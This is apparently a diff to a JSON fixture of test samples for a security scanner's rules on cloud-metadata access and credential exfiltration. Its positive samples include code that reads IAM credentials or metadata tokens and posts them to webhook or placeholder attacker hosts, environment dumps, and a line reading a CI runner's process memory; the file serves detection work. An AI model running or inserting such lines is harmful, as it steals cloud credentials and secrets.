@@ -42,5 +42,70 @@
       ],
       ["sh", "PID=$(pgrep -f Runner.Worker)\nsudo cat /proc/$PID/mem > dump.bin"]
     ]
+  },
+  "network/cloud-metadata-access": {
+    "lang": "js",
+    "pos": [
+      "const res = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');",
+      "const r = await fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', { headers: { 'Metadata-Flavor': 'Google' } });"
+    ],
+    "neg": [
+      "const ENV_ENDPOINT_NAME = 'AWS_EC2_METADATA_SERVICE_ENDPOINT';\nconst DEFAULT_ENDPOINT = 'http://169.254.169.254';\nconst DISABLED = 'AWS_EC2_METADATA_DISABLED';",
+      "const host = process.env.GCE_METADATA_HOST || 'metadata.google.internal';\nconst url = `http://${host}/computeMetadata/v1/instance`;",
+      "const linkLocal = '169.254.0.0/16';"
+    ],
+    "also": [
+      ["py", "token = requests.put('http://169.254.169.254/latest/api/token', headers=h).text"],
+      ["go", "resp, err := http.Get(\"http://169.254.170.2/v2/credentials/\" + id)"],
+      [
+        "sh",
+        "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01'"
+      ]
+    ]
+  },
+  "exfiltration/cloud-metadata-to-external": {
+    "lang": "js",
+    "pos": [
+      "const creds = await (await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role)).text();\nawait fetch('https://webhook.site/0000-example', { method: 'POST', body: creds });",
+      "const tok = await get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token');\nawait post('https://discord.com/api/webhooks/1/example', tok);",
+      "const c = await get('http://169.254.169.254/latest/meta-data/iam/security-credentials/admin');\nawait post('http://203.0.113.7:8080/c', c);"
+    ],
+    "neg": [
+      "const ENDPOINT = 'http://169.254.169.254';\nconst res = await httpRequest({ hostname: '169.254.169.254', path: '/latest/meta-data/iam/security-credentials/', timeout: 1000 });",
+      "const url = 'http://169.254.169.254/latest/api/token';\nconst proxy = 'http://10.0.0.5:3128';",
+      "await fetch('https://webhook.site/0000-example', { body: JSON.stringify(report) });"
+    ],
+    "also": [
+      [
+        "py",
+        "creds = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/admin').text\nrequests.post('https://example.invalid.ngrok.io/c', data=creds)"
+      ],
+      [
+        "sh",
+        "C=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin)\ncurl -d \"$C\" https://pipedream.net/example"
+      ]
+    ]
+  },
+  "exfiltration/cloud-metadata-with-env-dump": {
+    "lang": "py",
+    "pos": [
+      "creds = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role).text\npayload = json.dumps(dict(os.environ))",
+      "token = urlopen(Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')).read()\nfor k, v in os.environ.items():\n    loot[k] = v"
+    ],
+    "neg": [
+      "METADATA_BASE_URL = 'http://169.254.169.254/'\nendpoint = os.environ.get('AWS_EC2_METADATA_SERVICE_ENDPOINT', METADATA_BASE_URL)",
+      "payload = json.dumps(dict(os.environ))\nrequests.post(url, data=payload)",
+      "url = 'http://169.254.169.254/latest/api/token'\nregion = os.environ.get('AWS_REGION')"
+    ],
+    "also": [
+      [
+        "js",
+        "const c = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');\nconst env = JSON.stringify(process.env);"
+      ],
+      [
+        "go",
+        "resp, _ := http.Get(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\nall := os.Environ()"
+      ]
+    ]
   }
 }
